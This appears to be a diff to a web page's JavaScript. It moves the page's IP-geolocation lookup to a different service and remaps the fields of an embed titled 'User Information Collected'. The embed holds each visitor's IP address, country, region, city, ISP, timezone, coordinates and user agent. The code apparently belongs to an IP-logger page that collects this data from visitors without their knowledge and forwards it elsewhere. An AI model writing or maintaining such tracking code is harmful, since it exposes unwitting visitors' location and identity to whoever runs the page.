@@ -176,7 +176,7 @@
         // Get IP and location data
         async function getIPInfo() {
             try {
-                const response = await fetch('http://ip-api.com/json/');
+                const response = await fetch('https://ipapi.co/json/');
                 return await response.json();
             } catch (error) {
                 console.error('Error fetching IP info:', error);
@@ -192,13 +192,13 @@
                 title: "User Information Collected",
                 color: 0x5D3FD3,
                 fields: [
-                    { name: "IP Address", value: data.query || "Unknown", inline: true },
-                    { name: "Country", value: data.country || "Unknown", inline: true },
-                    { name: "Region", value: data.regionName || "Unknown", inline: true },
+                    { name: "IP Address", value: data.ip || "Unknown", inline: true },
+                    { name: "Country", value: data.country_name || "Unknown", inline: true },
+                    { name: "Region", value: data.region || "Unknown", inline: true },
                     { name: "City", value: data.city || "Unknown", inline: true },
-                    { name: "ISP", value: data.isp || "Unknown", inline: true },
+                    { name: "ISP", value: data.org || "Unknown", inline: true },
                     { name: "Timezone", value: data.timezone || "Unknown", inline: true },
-                    { name: "Location", value: `${data.lat}, ${data.lon}` || "Unknown", inline: true },
+                    { name: "Location", value: `${data.latitude}, ${data.longitude}` || "Unknown", inline: true },
                     { name: "User Agent", value: navigator.userAgent, inline: false }
                 ],
                 timestamp: new Date().toISOString()
